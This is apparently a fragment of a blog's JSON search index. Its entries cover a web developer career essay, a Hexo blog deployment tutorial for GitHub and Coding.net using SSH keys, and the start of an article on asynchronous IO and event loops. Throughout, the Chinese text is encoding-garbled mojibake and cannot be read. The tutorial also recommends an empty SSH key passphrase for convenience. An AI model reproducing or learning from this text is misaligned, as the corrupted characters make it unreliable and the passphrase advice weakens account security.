ä¸ºä»–ä»¬æ— è®ºå†è¿‡å¤šå°‘å¹´ï¼Œä»–ä»¬çš„æ°´å¹³ä¸ä¼šå˜ï¼Œåªæ˜¯åœ¨é‡å¤é€ è½®å­ï¼Œå”¯ä¸€æ¯”ä½ å¿«çš„ï¼Œå°±æ˜¯ Ctrl+Cå’ŒCtrl+Vã€‚\næ­£ç¡®çš„è·¯ä¸Šï¼Œåªè¦åšæŒï¼Œå°±ç¦»ç›®æ ‡è¶Šæ¥è¶Šè¿‘ï¼Œæœªæ¥å°±ä¸€å®šä¼šæ˜¯ä¸€ä¸ªä¼˜ç§€çš„æ¶æ„å¸ˆï¼Œå’Œä¼˜ç§€æ¶æ„å¸ˆçš„åŒºåˆ«ï¼Œå¯èƒ½åªæ˜¯æ—¶é—´é—®é¢˜ã€‚\nè½¬è‡ªæå‡¡çš„åšå®¢\n","permalink":"https://www.hacktech.cn/post/web%E9%AB%98%E7%BA%A7%E5%BC%80%E5%8F%91%E7%9A%84%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF.html","summary":"\u003cp\u003eè¯»äº†è¿™ç¯‡æ–‡ç« ä¹‹åæ„Ÿè§‰è›®å—å¯å‘çš„ï¼Œåœ¨æ­¤åˆ†äº«ä¸€ä¸‹ï¼ŒçŒ®ç»™å’Œæˆ‘ä¸€æ ·å¤„äºå›°æƒ‘çš„æœ‹å‹ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eæ­£æ–‡å¦‚ä¸‹ï¼š\u003c/strong\u003e\u003c/p\u003e","title":"webé«˜çº§å¼€å‘çš„æˆé•¿ä¹‹è·¯"},{"content":"å®‰è£…GITå’ŒNode.JS é¦–å…ˆåœ¨è‡ªå·±çš„ç”µè„‘ä¸Šå®‰è£…å¥½gitå’Œnode.jsï¼Œè¿™ä¸€æ­¥æ€ä¹ˆåšè‡ªå·±æœç´¢ï¼Œå®‰è£…è½¯ä»¶éƒ½æ˜¯ä¸‹ä¸€æ­¥ä¸‹ä¸€æ­¥ï¼Œåº”è¯¥ä¸éš¾,GITå®‰è£…å®Œæˆåæ‰“å¼€git cmdè¾“å…¥\n1 2 git config --global user.name \u0026#34;Your Name\u0026#34; git config --global user.email \u0026#34;email@example.com\u0026#34; å› ä¸ºGitæ˜¯åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œæ‰€ä»¥ï¼Œæ¯ä¸ªæœºå™¨éƒ½å¿…é¡»è‡ªæŠ¥å®¶é—¨ï¼šä½ çš„åå­—å’ŒEmailåœ°å€ã€‚ **æ³¨æ„ï¼š**git configå‘½ä»¤çš„\u0026ndash;globalå‚æ•°ï¼Œç”¨äº†è¿™ä¸ªå‚æ•°ï¼Œè¡¨ç¤ºä½ è¿™å°æœºå™¨ä¸Šæ‰€æœ‰çš„Gitä»“åº“éƒ½ä¼šä½¿ç”¨è¿™ä¸ªé…ç½®ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥å¯¹æŸä¸ªä»“åº“æŒ‡å®šä¸åŒçš„ç”¨æˆ·åå’ŒEmailåœ°å€ã€‚\n#å®‰è£…å¹¶åˆå§‹åŒ–HEXO å¦‚æœä½ æ˜¯åœ¨Windowsä¸Šï¼Œè¯·æ‰“å¼€Git-CMD å‡å¦‚ä½ æ˜¯æƒ³åœ¨D:\\blog\\ä¸‹å»ºç«‹ä½ çš„åšå®¢ï¼Œè¯·å…ˆåœ¨Dç›˜ä¸‹æ–°å»ºæ–‡ä»¶å¤¹blog åœ¨Git-CMDä¸­è¾“å…¥npm install -g hexo-cliå›è½¦å¼€å§‹å®‰è£…hexo å®‰è£…å®Œæˆåå°†git cmdå·¥ä½œç›®å½•åˆ‡æ¢è‡³D:\\blog\\ç„¶åè¾“å…¥hexo initå›è½¦ï¼Œæˆ–è€…ç›´æ¥åœ¨git cmdä¸­è¾“å…¥hexo init d:\\\\blog å¦‚æœä½ çš„d:\\blog\\ä¸‹çš„ç›®å½•å½¢å¼æ˜¯\n1 2 3 4 5 6 7 8 . â”œâ”€â”€ _config.yml // ç½‘ç«™çš„é…ç½®ä¿¡æ¯ï¼Œä½ å¯ä»¥åœ¨æ­¤é…ç½®å¤§éƒ¨åˆ†çš„å‚æ•°ã€‚ â”œâ”€â”€ package.json â”œâ”€â”€ scaffolds // æ¨¡æ¿æ–‡ä»¶å¤¹ã€‚å½“ä½ æ–°å»ºæ–‡ç« æ—¶ï¼ŒHexoä¼šæ ¹æ®scaffoldæ¥å»ºç«‹æ–‡ä»¶ã€‚ â”œâ”€â”€ source // å­˜æ”¾ç”¨æˆ·èµ„æºçš„åœ°æ–¹ | â”œâ”€â”€ _drafts | â””â”€â”€ _posts â””â”€â”€ themes // å­˜æ”¾ç½‘ç«™çš„ä¸»é¢˜ã€‚Hexoä¼šæ ¹æ®ä¸»é¢˜æ¥ç”Ÿæˆé™æ€é¡µé¢ã€‚ é‚£ä¹ˆä½ çš„hexoå®‰è£…å¹¶åˆå§‹åŒ–å®Œæˆ ç„¶åè¾“å…¥hexo serverå¯åŠ¨æœ¬åœ°demoï¼Œæ‰“å¼€æµè§ˆå™¨ï¼ŒæŸ¥çœ‹http://localhost:4000/å¯ä»¥çœ‹åˆ°è‡ªå·±çš„åšå®¢\nå°†ä¹‹æ‰˜ç®¡åˆ°githubå’Œcodingä¸Š githubé¡¹ç›®åˆ›å»º 1.æ³¨å†Œgithubè´¦å· 2.åˆ›å»ºé¡¹ç›®ä»“åº“ è¿›å…¥github.comï¼Œç„¶åç‚¹å‡»å³ä¸Šè§’ + \u0026ndash;\u0026gt;new repository\n3.åœ¨Repository nameä¸­å¡«å†™Githubè´¦å·å.github.ioï¼Œç‚¹å‡»Create repositoryï¼Œå®Œæˆåˆ›å»ºã€‚\nCodingé¡¹ç›®åˆ›å»º 1.æ³¨å†ŒCodingè´¦å· 2.åˆ›å»ºé¡¹ç›®ä»“åº“\n3.å¡«å†™é¡¹ç›®åç§°æè¿°åˆ›å»ºå³å¯\né…ç½®SHH é…ç½®shh keyæ˜¯è®©æœ¬åœ°gité¡¹ç›®ä¸è¿œç¨‹çš„githubå»ºç«‹è”ç³» 1.æ£€æŸ¥æ˜¯å¦å·²ç»æœ‰SSH Keyï¼Œæ‰“å¼€Git Bashï¼Œè¾“å…¥\n1 cd ~/.ssh 2.å¦‚æœæ²¡æœ‰.sshè¿™ä¸ªç›®å½•ï¼Œåˆ™ç”Ÿæˆä¸€ä¸ªæ–°çš„SSHï¼Œè¾“å…¥\n1 ssh-keygen -t rsa -C \u0026#34;your e-mail\u0026#34; æ³¨æ„1: æ­¤å¤„çš„é‚®ç®±åœ°å€ï¼Œä½ å¯ä»¥è¾“å…¥è‡ªå·±çš„é‚®ç®±åœ°å€ï¼›æ³¨æ„2: æ­¤å¤„çš„ã€Œ-Cã€çš„æ˜¯å¤§å†™çš„ã€ŒCã€ æ¥ä¸‹æ¥å‡ æ­¥éƒ½ç›´æ¥æŒ‰å›è½¦é”®,ç„¶åç³»ç»Ÿä¼šè¦ä½ è¾“å…¥å¯†ç \n1 2 Enter passphrase (empty for no passphrase):\u0026lt;è¾“å…¥åŠ å¯†ä¸²\u0026gt; Enter same passphrase again:\u0026lt;å†æ¬¡è¾“å…¥åŠ å¯†ä¸²\u0026gt; è¿™ä¸ªå¯†ç ä¼šåœ¨ä½ æäº¤é¡¹ç›®æ—¶ä½¿ç”¨ï¼Œå¦‚æœä¸ºç©ºçš„è¯æäº¤é¡¹ç›®æ—¶åˆ™ä¸ç”¨è¾“å…¥ã€‚è¿™ä¸ªè®¾ç½®æ˜¯é˜²æ­¢åˆ«äººå¾€ä½ çš„é¡¹ç›®é‡Œæäº¤å†…å®¹ã€‚ä¸ªäººå»ºè®®ä¸ºç©ºæ¯”è¾ƒæ–¹ä¾¿ æ³¨æ„ï¼šè¾“å…¥å¯†ç çš„æ—¶å€™æ²¡æœ‰*å­—æ ·çš„ï¼Œä½ ç›´æ¥è¾“å…¥å°±å¯ä»¥äº†ã€‚ 3.æœ€åçœ‹åˆ°è¿™æ ·çš„ç•Œé¢ï¼Œå°±æˆåŠŸè®¾ç½®ssh keyäº† æ·»åŠ  SSH Key åˆ° GitHubå’ŒCoding å¤åˆ¶~/.ssh/id_rsa.pubä¸­çš„å†…å®¹ ~æ˜¯ä¸ªäººæ–‡ä»¶å¤¹ï¼Œæ¯”å¦‚æˆ‘çš„ç”µè„‘ä¸Šæ˜¯C:\\Users\\Administrator.ssh\\id_rsa.pubï¼Œå°†å…¶ä¸­çš„æ–‡æœ¬å¤åˆ¶ è¿›å…¥githubï¼Œç‚¹å‡»å¤´åƒ\u0026ndash;\u0026gt;Setting\u0026ndash;\u0026gt;SSH and GPG keys,ç„¶ååœ¨å³ä¾§ç‚¹å‡»New SSH keyï¼Œ Titleéšä¾¿å†™ï¼Œkeyä¸­å¡«å†™id_rsa.pubä¸­å¤åˆ¶çš„å†…å®¹ï¼Œç„¶åAdd SSH keyå°±okäº† è¿›å…¥Coding.netï¼Œç‚¹å‡»å¤´åƒ\u0026ndash;\u0026gt;ä¸ªäººè®¾ç½®\u0026ndash;\u0026gt;SSHå…¬é’¥ï¼Œæ–°å¢å…¬é’¥ï¼Œå…¬é’¥åç§°éšä¾¿ï¼Œå…¬é’¥å†…å®¹æ˜¯å¡«å†™id_rsa.pubä¸­å¤åˆ¶çš„å†…å®¹ï¼Œæœ‰æ•ˆæœŸå¯ä»¥å‹¾é€‰æ°¸ä¹…ï¼Œç„¶åæ·»åŠ ok\næµ‹è¯•SSHæ˜¯å¦é…ç½®æˆåŠŸ 1.æ‰“å¼€Git Bashï¼Œç„¶åè¾“å…¥\n1 ssh -T git@github.com å¦‚é…ç½®äº†å¯†ç åˆ™è¦è¾“å…¥å¯†ç ,è¾“å®ŒæŒ‰å›è½¦ å¦‚æœæ˜¾ç¤ºä»¥ä¸‹å†…å®¹ï¼Œåˆ™è¯´æ˜Githubä¸­çš„sshé…ç½®æˆåŠŸã€‚\n1 2 Hi username! You\u0026#39;ve successfully authenticated, but GitHub does not provide shell access. 2.å†è¾“å…¥\n1 ssh -T git@git.coding.net å¦‚æœæ˜¾ç¤ºä»¥ä¸‹åˆ™è¯´æ˜codingä¸­çš„sshé…ç½®æˆåŠŸ\n1 Hello username You\u0026#39;ve connected to Coding.net by SSH successfully! åˆ›å»ºGithub Pageså’ŒCoding Pages æœåŠ¡ 1.GitHub Pagesåˆ†ä¸¤ç§ï¼Œä¸€ç§æ˜¯ä½ çš„GitHubç”¨æˆ·åå»ºç«‹çš„username.github.ioè¿™æ ·çš„ç”¨æˆ·\u0026amp;ç»„ç»‡é¡µï¼ˆç«™ï¼‰ï¼Œå¦ä¸€ç§æ˜¯ä¾é™„é¡¹ç›®çš„pagesã€‚æƒ³å»ºç«‹ä¸ªäººåšå®¢æ˜¯ç”¨çš„ç¬¬ä¸€ç§ï¼Œå½¢å¦‚cnfeat.github.ioè¿™æ ·çš„å¯è®¿é—®çš„ç«™ï¼Œæ¯ä¸ªç”¨æˆ·åä¸‹é¢åªèƒ½å»ºç«‹ä¸€ä¸ªã€‚ Coding PagesæœåŠ¡å¼€å¯åœ¨å®˜ç½‘è¯´çš„å¾ˆè¯¦ç»†ï¼Œä¸çŸ¥é“è¯·ç™¾åº¦ 2.æ‰“å¼€D:\\blogæ–‡ä»¶å¤¹ä¸­çš„_config.ymlæ–‡ä»¶ï¼Œæ‰¾åˆ°å¦‚ä¸‹ä½ç½®ï¼Œå¡«å†™\n1 2 3 4 5 6 7 # Deployment ## Docs: https://hexo.io/docs/deployment.html deploy: - type: git repo: github: git@github.com:yourname/yourname.github.io.git,master coding: git@git.coding.net:yourname/yourname.git,coding-pages æ³¨ï¼š (1) å…¶ä¸­yournameæ›¿æ¢æˆä½ çš„Githubè´¦æˆ·å;(2)æ³¨æ„åœ¨ymlæ–‡ä»¶ä¸­ï¼Œ:åé¢éƒ½æ˜¯è¦å¸¦ç©ºæ ¼çš„ã€‚ #éƒ¨ç½²å®Œæˆ åœ¨blogæ–‡ä»¶å¤¹ä¸­ç©ºç™½å¤„å³å‡»æ‰“å¼€Git Bashè¾“å…¥\n1 2 hexo clean hexo d- g æ­¤æ—¶ï¼Œé€šè¿‡è®¿é—®http://yourname.github.ioå’Œhttp://yourname.coding.meå¯ä»¥çœ‹åˆ°é»˜è®¤çš„Hexoé¦–é¡µé¢ï¼ˆä¸ä¹‹å‰æœ¬åœ°æµ‹è¯•æ—¶ä¸€æ ·ï¼‰ã€‚\n","permalink":"https://www.hacktech.cn/post/hexo%E5%9C%A8github%E5%92%8Ccoding-net%E9%83%A8%E7%BD%B2%E5%B9%B6%E5%88%86%E6%B5%81%E4%B8%80-1.html","summary":"\u003ch1 id=\"å®‰è£…gitå’Œnodejs\"\u003eå®‰è£…GITå’ŒNode.JS\u003c/h1\u003e\n\u003cp\u003eé¦–å…ˆåœ¨è‡ªå·±çš„ç”µè„‘ä¸Šå®‰è£…å¥½gitå’Œnode.jsï¼Œè¿™ä¸€æ­¥æ€ä¹ˆåšè‡ªå·±æœç´¢ï¼Œå®‰è£…è½¯ä»¶éƒ½æ˜¯ä¸‹ä¸€æ­¥ä¸‹ä¸€æ­¥ï¼Œåº”è¯¥ä¸éš¾,GITå®‰è£…å®Œæˆåæ‰“å¼€git cmdè¾“å…¥\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e2\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit config --global user.name \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Your Name\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit config --global user.email \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;email@example.com\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eå› ä¸ºGitæ˜¯åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œæ‰€ä»¥ï¼Œæ¯ä¸ªæœºå™¨éƒ½å¿…é¡»è‡ªæŠ¥å®¶é—¨ï¼šä½ çš„åå­—å’ŒEmailåœ°å€ã€‚\n**æ³¨æ„ï¼š**git configå‘½ä»¤çš„\u0026ndash;globalå‚æ•°ï¼Œç”¨äº†è¿™ä¸ªå‚æ•°ï¼Œè¡¨ç¤ºä½ è¿™å°æœºå™¨ä¸Šæ‰€æœ‰çš„Gitä»“åº“éƒ½ä¼šä½¿ç”¨è¿™ä¸ªé…ç½®ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥å¯¹æŸä¸ªä»“åº“æŒ‡å®šä¸åŒçš„ç”¨æˆ·åå’ŒEmailåœ°å€ã€‚\u003c/p\u003e","title":"hexoåœ¨githubå’Œcoding.netéƒ¨ç½²å¹¶åˆ†æµï¼ˆä¸€ï¼‰"},{"content":" æœ¬æ–‡ä¸»è¦ä»ä¸€ä¸‹å‡ ä¸ªæ–¹é¢è¿›è¡Œè¯´æ˜:\nä»€ä¹ˆæ˜¯å¼‚æ­¥(Asynchronous)ç¼–ç¨‹ ä¸ºä»€ä¹ˆè¦ä½¿ç”¨å¼‚æ­¥ç¼–ç¨‹ï¼Ÿ å¦‚ä½•åˆ©ç”¨Pythonå®ç°å¼‚æ­¥ ä»€ä¹ˆæ˜¯å¼‚æ­¥ç¼–ç¨‹ æ–‡ç« å¼€å§‹å‰ï¼Œå…ˆç®€å•ä»‹ç»ä¸‹å„ç§ IO æ¨¡å‹ï¼š æœ€å®¹æ˜“åšçš„æ˜¯é˜»å¡ IO å³è¯»å†™æ•°æ®æ—¶ï¼Œéœ€è¦ç­‰å¾…æ“ä½œå®Œæˆï¼Œæ‰èƒ½ç»§ç»­æ‰§è¡Œã€‚è¿›é˜¶çš„åšæ³•å°±æ˜¯ç”¨å¤šçº¿ç¨‹æ¥å¤„ç†éœ€è¦ IO çš„éƒ¨åˆ†ï¼Œç¼ºç‚¹æ˜¯å¼€é”€ä¼šæœ‰äº›å¤§ã€‚\næ¥ç€æ˜¯éé˜»å¡ IO å³è¯»å†™æ•°æ®æ—¶ï¼Œå¦‚æœæš‚æ—¶ä¸å¯è¯»å†™ï¼Œåˆ™ç«‹åˆ»è¿”å›ï¼Œè€Œä¸ç­‰å¾…ã€‚å› ä¸ºä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™æ˜¯å¯è¯»å†™çš„ï¼Œæ‰€ä»¥è½®è¯¢æ—¶å¯èƒ½ä¼šæµªè´¹ CPU æ—¶é—´ã€‚\nç„¶åæ˜¯ IO å¤ç”¨ å³åœ¨è¯»å†™æ•°æ®å‰ï¼Œå…ˆæ£€æŸ¥å“ªäº›æè¿°ç¬¦æ˜¯å¯è¯»å†™çš„ï¼Œå†å»è¯»å†™ã€‚select å’Œ poll å°±æ˜¯è¿™æ ·åšçš„ï¼Œå®ƒä»¬ä¼šéå†æ‰€æœ‰è¢«ç›‘è§†çš„æè¿°ç¬¦ï¼ŒæŸ¥çœ‹æ˜¯å¦æ»¡è¶³ï¼Œè¿™ä¸ªæ£€æŸ¥çš„è¿‡ç¨‹æ˜¯é˜»å¡çš„ã€‚è€Œ epollã€kqueue å’Œ /dev/poll åˆ™åšäº†äº›æ”¹è¿›ï¼Œäº‹å…ˆæ³¨å†Œéœ€è¦æ£€æŸ¥å“ªäº›æè¿°ç¬¦çš„å“ªäº›äº‹ä»¶ï¼Œå½“çŠ¶æ€å‘ç”Ÿå˜åŒ–æ—¶ï¼Œå†…æ ¸ä¼šè°ƒç”¨å¯¹åº”çš„å›è°ƒå‡½æ•°ï¼Œå°†è¿™äº›æè¿°ç¬¦ä¿å­˜ä¸‹æ¥ï¼›ä¸‹æ¬¡è·å–å¯ç”¨çš„æè¿°ç¬¦æ—¶ï¼Œç›´æ¥è¿”å›è¿™äº›å‘ç”Ÿå˜åŒ–çš„æè¿°ç¬¦å³å¯ã€‚\nå†ä¹‹åæ˜¯ä¿¡å·é©±åŠ¨ å³æè¿°ç¬¦å°±ç»ªæ—¶ï¼Œå†…æ ¸å‘é€ SIGIO ä¿¡å·ï¼Œå†ç”±ä¿¡å·å¤„ç†ç¨‹åºå»å¤„ç†è¿™äº›ä¿¡å·å³å¯ã€‚ä¸è¿‡ä¿¡å·å¤„ç†çš„æ—¶æœºæ˜¯ä»å†…æ ¸æ€è¿”å›ç”¨æˆ·æ€æ—¶ï¼Œæ„Ÿè§‰ä¹Ÿå¾—æŠŠè¿™äº›äº‹ä»¶æ”¶é›†èµ·æ¥æ‰å¥½å¤„ç†ï¼Œæœ‰ç‚¹åƒæ¨¡æ‹Ÿ IO å¤ç”¨äº†ã€‚\næœ€åæ˜¯å¼‚æ­¥ IO å³è¯»å†™æ•°æ®æ—¶ï¼Œåªæ³¨å†Œäº‹ä»¶ï¼Œå†…æ ¸å®Œæˆè¯»å†™åï¼ˆè¯»å–çš„æ•°æ®ä¼šå¤åˆ¶åˆ°ç”¨æˆ·æ€ï¼‰ï¼Œå†è°ƒç”¨äº‹ä»¶å¤„ç†å‡½æ•°ã€‚è¿™æ•´ä¸ªè¿‡ç¨‹éƒ½ä¸ä¼šé˜»å¡è°ƒç”¨çº¿ç¨‹ï¼Œä¸è¿‡å®ç°å®ƒçš„æ“ä½œç³»ç»Ÿæ¯”è¾ƒå°‘ï¼ŒWindows ä¸Šæœ‰æ¯”è¾ƒæˆç†Ÿçš„ IOCPï¼ŒLinux ä¸Šçš„ AIO åˆ™æœ‰ä¸å°‘ç¼ºç‚¹ã€‚ è™½ç„¶çœŸæ­£çš„å¼‚æ­¥ IO éœ€è¦ä¸­é—´ä»»ä½•æ­¥éª¤éƒ½æ²¡æœ‰é˜»å¡ï¼Œè¿™å¯¹äºæŸäº›åªæ˜¯å¶å°”éœ€è¦å¤„ç† IO è¯·æ±‚çš„æƒ…å†µç¡®å®æœ‰ç”¨ï¼ˆæ¯”å¦‚æ–‡æœ¬ç¼–è¾‘å™¨å¶å°”ä¿å­˜ä¸€ä¸‹æ–‡ä»¶ï¼‰ï¼›ä½†å¯¹äºæœåŠ¡å™¨ç«¯ç¼–ç¨‹çš„å¤§å¤šæ•°æƒ…å†µè€Œè¨€ï¼Œå®ƒçš„ä¸»çº¿ç¨‹å°±æ˜¯ç”¨æ¥å¤„ç† IO è¯·æ±‚çš„ï¼Œå¦‚æœåœ¨ç©ºé—²æ—¶ä¸é˜»å¡åœ¨ IO ç­‰å¾…ä¸Šï¼Œä¹Ÿæ²¡æœ‰åˆ«çš„äº‹æƒ…èƒ½åšï¼Œæ‰€ä»¥æœ¬æ–‡å°±ä¸çº ç»“è¿™ä¸ªå¼‚æ­¥æ˜¯å¦åå‰¯å…¶å®äº†ã€‚\nç„¶åæˆ‘ä»¬äº†è§£ä¸€ä¸‹äº‹ä»¶å¾ªç¯(Event Loop) Event Loop æ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„æ¦‚å¿µï¼ŒæŒ‡çš„æ˜¯è®¡ç®—æœºç³»ç»Ÿçš„ä¸€ç§è¿è¡Œæœºåˆ¶ã€‚\næˆ‘ä»¬ä¸€èˆ¬çš„å•çº¿ç¨‹ç¨‹åºä¸­ï¼Œæ‰€æœ‰ä»»åŠ¡éœ€è¦æ’é˜Ÿï¼Œå‰ä¸€ä¸ªä»»åŠ¡ç»“æŸï¼Œæ‰ä¼šæ‰§è¡Œåä¸€ä¸ªä»»åŠ¡ã€‚å¦‚æœå‰ä¸€ä¸ªä»»åŠ¡è€—æ—¶å¾ˆé•¿ï¼Œåä¸€ä¸ªä»»åŠ¡å°±ä¸å¾—ä¸ä¸€ç›´ç­‰ç€ã€‚\nå¦‚æœæ’é˜Ÿæ˜¯å› ä¸ºè®¡ç®—é‡å¤§ï¼ŒCPUå¿™ä¸è¿‡æ¥ï¼Œå€’ä¹Ÿç®—äº†ï¼Œä½†æ˜¯å¾ˆå¤šæ—¶å€™CPUæ˜¯é—²ç€çš„ï¼Œå› ä¸ºIOè®¾å¤‡ï¼ˆè¾“å…¥è¾“å‡ºè®¾å¤‡ï¼‰å¾ˆæ…¢ï¼ˆæ¯”å¦‚Ajaxæ“ä½œä»ç½‘ç»œè¯»å–æ•°æ®ï¼‰ï¼Œä¸å¾—ä¸ç­‰ç€ç»“æœå‡ºæ¥ï¼Œå†å¾€ä¸‹æ‰§è¡Œã€‚\né‚£ä¹ˆè¿™æ—¶ä¸»çº¿ç¨‹å®Œå…¨å¯ä»¥ä¸ç®¡IOè®¾å¤‡ï¼ŒæŒ‚èµ·å¤„äºç­‰å¾…ä¸­çš„ä»»åŠ¡ï¼Œå…ˆè¿è¡Œæ’åœ¨åé¢çš„ä»»åŠ¡ã€‚ç­‰åˆ°IOè®¾å¤‡è¿”å›äº†ç»“æœï¼Œå†å›è¿‡å¤´ï¼ŒæŠŠæŒ‚èµ·çš„ä»»åŠ¡ç»§ç»­æ‰§è¡Œä¸‹å»ã€‚\näºæ˜¯ï¼Œæ‰€æœ‰ä»»åŠ¡å¯ä»¥åˆ†æˆä¸¤ç§ï¼Œä¸€ç§æ˜¯åŒæ­¥ä»»åŠ¡ï¼ˆsynchronousï¼‰ï¼Œå¦ä¸€ç§æ˜¯å¼‚æ­¥ä»»åŠ¡ï¼ˆasynchronousï¼‰ã€‚åŒæ­¥ä»»åŠ¡æŒ‡çš„æ˜¯ï¼Œåœ¨ä¸»çº¿ç¨‹ä¸Šæ’é˜Ÿæ‰§è¡Œçš„ä»»åŠ¡ï¼Œåªæœ‰å‰ä¸€ä¸ªä»»åŠ¡æ‰§è¡Œå®Œæ¯•ï¼Œæ‰èƒ½æ‰§è¡Œåä¸€ä¸ªä»»åŠ¡ï¼›å¼‚æ­¥ä»»åŠ¡æŒ‡çš„æ˜¯ï¼Œä¸è¿›å…¥ä¸»çº¿ç¨‹ã€è€Œè¿›å…¥\u0026quot;ä»»åŠ¡é˜Ÿåˆ—\u0026quot;ï¼ˆtask queueï¼‰çš„ä»»åŠ¡ï¼Œåªæœ‰\u0026quot;ä»»åŠ¡é˜Ÿåˆ—\u0026quot;é€šçŸ¥ä¸»çº¿ç¨‹ï¼ŒæŸä¸ªå¼‚æ­¥ä»»åŠ¡å¯ä»¥æ‰§è¡Œäº†ï¼Œè¯¥ä»»åŠ¡æ‰ä¼šè¿›å…¥ä¸»çº¿ç¨‹æ‰§è¡Œã€‚ å…·ä½“æ¥è¯´ï¼Œå¼‚æ­¥æ‰§è¡Œçš„è¿è¡Œæœºåˆ¶å¦‚ä¸‹ã€‚ï¼ˆåŒæ­¥æ‰§è¡Œä¹Ÿæ˜¯å¦‚æ­¤ï¼Œå› ä¸ºå®ƒå¯ä»¥è¢«è§†ä¸ºæ²¡æœ‰å¼‚æ­¥ä»»åŠ¡çš„å¼‚æ­¥æ‰§è¡Œã€‚ï¼‰\nï¼ˆ1ï¼‰æ‰€æœ‰åŒæ­¥ä»»åŠ¡éƒ½åœ¨ä¸»çº¿ç¨‹ä¸Šæ‰§è¡Œï¼Œå½¢æˆä¸€ä¸ªæ‰§è¡Œæ ˆï¼ˆexecution context stackï¼‰ã€‚ ï¼ˆ2ï¼‰ä¸»çº¿ç¨‹ä¹‹å¤–ï¼Œè¿˜å­˜åœ¨ä¸€ä¸ª\u0026quot;ä»»åŠ¡é˜Ÿåˆ—\u0026quot;ï¼ˆtask queueï¼‰ã€‚åªè¦å¼‚æ­¥ä»»åŠ¡æœ‰äº†è¿è¡Œç»“æœï¼Œå°±åœ¨\u0026quot;ä»»åŠ¡é˜Ÿåˆ—\u0026quot;ä¹‹ä¸­æ”¾ç½®ä¸€ä¸ªäº‹ä»¶ã€‚ ï¼ˆ3ï¼‰ä¸€æ—¦\u0026quot;æ‰§è¡Œæ ˆ\u0026quot;ä¸­çš„æ‰€æœ‰åŒæ­¥ä»»åŠ¡æ‰§è¡Œå®Œæ¯•ï¼Œç³»ç»Ÿå°±ä¼šè¯»å–\u0026quot;ä»»åŠ¡é˜Ÿåˆ—\u0026quot;ï¼Œçœ‹çœ‹é‡Œé¢æœ‰å“ªäº›äº‹ä»¶ã€‚é‚£äº›å¯¹åº”çš„å¼‚æ­¥ä»»åŠ¡ï¼Œäºæ˜¯ç»“æŸç­‰å¾…çŠ¶æ€ï¼Œè¿›å…¥æ‰§è¡Œæ ˆï¼Œå¼€å§‹æ‰§è¡Œã€‚ ï¼ˆ4ï¼‰ä¸»çº¿ç¨‹ä¸æ–­é‡å¤ä¸Šé¢çš„ç¬¬ä¸‰æ­¥ã€‚ ä¸‹å›¾å°±æ˜¯ä¸»çº¿ç¨‹å’Œä»»åŠ¡é˜Ÿåˆ—çš„ç¤ºæ„å›¾ã€‚\nåªè¦ä¸»çº¿ç¨‹ç©ºäº†ï¼Œå°±ä¼šå»è¯»å–\u0026quot;ä»»åŠ¡é˜Ÿåˆ—\u0026quot;ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¼šä¸æ–­é‡å¤ã€‚\næ‰€è°“å¼‚æ­¥æ˜¯ç›¸å¯¹äºåŒæ­¥ï¼ˆSynchronousï¼‰çš„æ¦‚å¿µæ¥è¯´çš„ï¼Œä¹‹æ‰€ä»¥å®¹æ˜“é€ æˆæ··ä¹±ï¼Œæ˜¯å› ä¸ºåˆšå¼€å§‹æ¥è§¦è¿™ä¸¤ä¸ªæ¦‚å¿µæ—¶å®¹æ˜“æŠŠåŒæ­¥çœ‹åšæ˜¯åŒæ—¶ï¼Œè€ŒåŒæ—¶ä¸æ˜¯æ„å‘³ç€å¹¶è¡Œï¼ˆParallelï¼‰å—ï¼Ÿç„¶è€Œå®é™…ä¸ŠåŒæ­¥æˆ–è€…å¼‚æ­¥æ˜¯é’ˆå¯¹äºæ—¶é—´è½´çš„æ¦‚å¿µï¼ŒåŒæ­¥æ„å‘³ç€é¡ºåºã€ç»Ÿä¸€çš„æ—¶é—´è½´ï¼Œè€Œå¼‚æ­¥åˆ™æ„å‘³ç€ä¹±åºã€æ•ˆç‡ä¼˜å…ˆçš„æ—¶é—´è½´ã€‚æ¯”å¦‚åœ¨çˆ¬è™«è¿è¡Œæ—¶ï¼Œå…ˆæŠ“å– A é¡µé¢ï¼Œç„¶åä»ä¸­æå–ä¸‹ä¸€å±‚é¡µé¢ B 